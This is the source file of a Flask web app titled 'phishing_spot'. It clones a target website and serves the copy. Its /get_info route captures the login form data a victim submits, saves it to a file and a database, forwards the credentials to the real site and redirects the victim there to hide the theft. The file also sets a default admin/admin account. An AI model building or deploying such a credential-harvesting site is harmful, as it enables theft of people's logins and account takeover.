import os
from user import User
from config import Config
from flask import Flask, render_template, request, flash, Markup, redirect, url_for, abort
from flask_admin.contrib.sqla import ModelView
from flask_admin import Admin
from flask_security import Security, SQLAlchemyUserDatastore
from flask_security.utils import hash_password
from extentsions import db
from flask_admin import helpers as admin_helpers
from site_duplicator import SiteDuplicator
import logging
import tldextract
from state import State
import urllib.parse
import urllib.request
from sql_alchemy.models import Base, DbUser, DbDetails, FlaskUser, FlaskRole


def create_app(config_object=Config):
    """An application factory, as explained here: http://flask.pocoo.org/docs/patterns/appfactories/.
    :param config_object: The configuration object to use.
    """
    app = Flask(__name__)
    app.config.from_object(config_object)
    register_extensions(app)
    # register_blueprints(app)
    # register_errorhandlers(app)
    # register_shellcontext(app)
    # register_commands(app)
    return app


def register_extensions(app):
    db.init_app(app)


app = create_app()
security = Security(app, db_security)
db_security = SQLAlchemyUserDatastore(db, FlaskUser, FlaskRole)

admin = Admin(app, name='phishing_spot', base_template="mymaster.html", template_mode='bootstrap3')
admin.add_view(ModelView(FlaskUser, db.session))
admin.add_view(ModelView(FlaskRole, db.session))


# define a context processor for merging flask-admin's template context into the
# flask-security views.


@security.context_processor
def security_context_processor():
    return dict(
        admin_base_template=admin.base_template,
        admin_view=admin.index_view,
        h=admin_helpers,
        get_url=url_for,

    )


@app.before_first_request
def setup():
    # Recreate database each time for demo
    Base.metadata.drop_all(bind=db.engine)
    Base.metadata.create_all(bind=db.engine)
    print(db.session.query(DbUser).all())
    print(db.session.query(DbDetails).all())

# a = DbUser()
# db.session.add(a)
# db.session.commit()


@app.route("/get_info", methods=['POST'])
def get_info():
    """
    Function is used for storing user details and creating a file
    submits login form to site and redirect to original site
    :return: the original site
    """
    State.login_form = request.form
    State.current_user = User(request)
    State.current_user.create_user_file()
    State.current_user.add_user_to_db(db)
    logging.debug(get_info.__name__ + " created user file")
    if State.login_form is not None and State.prev_login_action is not None:
        print("inside if")
        data = urllib.parse.urlencode(State.login_form).encode('utf-8')             # prepare to send back form to original site
        urllib.request.urlopen(State.prev_login_action, data=data)  # send form data
    return redirect(State.prev_login_action, code=307)                        # redirect to original site


@app.route('/dup_site', methods=['POST'])
def dup_site():
    """
        duplicates the site requested from the user and displays the url
    """
    State.site = request.form['site']
    duplicate_site()
    return render_template('index.html', duplicated=State.duplicated, site=str(State.domain))


@app.route("/clones/<string:domain>")
def run_clone(domain):
    """
    Displays the cloned site
    :param domain: the domain of the site
    :return: duplicated site
    """
    flash(State.html_to_display)
    logging.debug(run_clone.__name__ + " running cloned website")
    return render_template('result.html')


@app.route("/redirect_login/<site>", methods=['GET'])
def redirect_login(site):
    """
    Function is used for redirecting login url from already duplicated site
    :param site: login site to duplicate
    :return: duplicated login site
    """
    State.site = site.replace("^s^", '/')
    duplicate_site()
    flash(State.html_to_display)
    return render_template('result.html')


@app.route("/")
def index():
    return render_template('index.html', duplicated=False)


def duplicate_site():
    """
    duplicates the requested site in State.site
    :return:
    """
    State.domain = tldextract.extract(State.site).domain
    sd = SiteDuplicator(State.site)                             # create a site duplicator with current site
    if sd.generate_duplicated_site():                           # downloads the html and obtain a beautiful soup object
        State.html_to_display = Markup(sd.soup.contents[2])     # mark content as safe to display
        State.duplicated = True
        State.prev_login_action = sd.prev_login_action                # saves the original action of the login form
        logging.debug(dup_site.__class__.__name__ + " new html is ready")


def build_sample_db():
    """
    Populate a small db with some example entries.
    """

    import string
    import random

    db.drop_all()
    db.create_all()

    with app.app_context():
        user_role = FlaskRole(name='user')
        super_user_role = FlaskRole(name='superuser')
        db.session.add(user_role)
        db.session.add(super_user_role)
        db.session.commit()

        test_user = db_security.create_user(
            first_name='Admin',
            email='admin',
            password=hash_password('admin'),
            roles=[user_role, super_user_role]
        )

        first_names = [
            'Harry', 'Amelia', 'Oliver', 'Jack', 'Isabella', 'Charlie', 'Sophie', 'Mia',
            'Jacob', 'Thomas', 'Emily', 'Lily', 'Ava', 'Isla', 'Alfie', 'Olivia', 'Jessica',
            'Riley', 'William', 'James', 'Geoffrey', 'Lisa', 'Benjamin', 'Stacey', 'Lucy'
        ]
        last_names = [
            'Brown', 'Smith', 'Patel', 'Jones', 'Williams', 'Johnson', 'Taylor', 'Thomas',
            'Roberts', 'Khan', 'Lewis', 'Jackson', 'Clarke', 'James', 'Phillips', 'Wilson',
            'Ali', 'Mason', 'Mitchell', 'Rose', 'Davis', 'Davies', 'Rodriguez', 'Cox', 'Alexander'
        ]

        for i in range(len(first_names)):
            tmp_email = first_names[i].lower() + "." + last_names[i].lower() + "@example.com"
            tmp_pass = ''.join(random.choice(string.ascii_lowercase + string.digits) for i in range(10))
            db_security.create_user(
                first_name=first_names[i],
                last_name=last_names[i],
                email=tmp_email,
                password=hash_password(tmp_pass),
                roles=[user_role, ]
            )
        db.session.commit()
    return


if __name__ == '__main__':

    # Build a sample db on the fly, if one does not exist yet.
    app_dir = os.path.realpath(os.path.dirname(__file__))
    database_path = os.path.join(app_dir, app.config['DATABASE_FILE'])
    if not os.path.exists(database_path):
        build_sample_db()

        # Start app
app.run(debug=True)

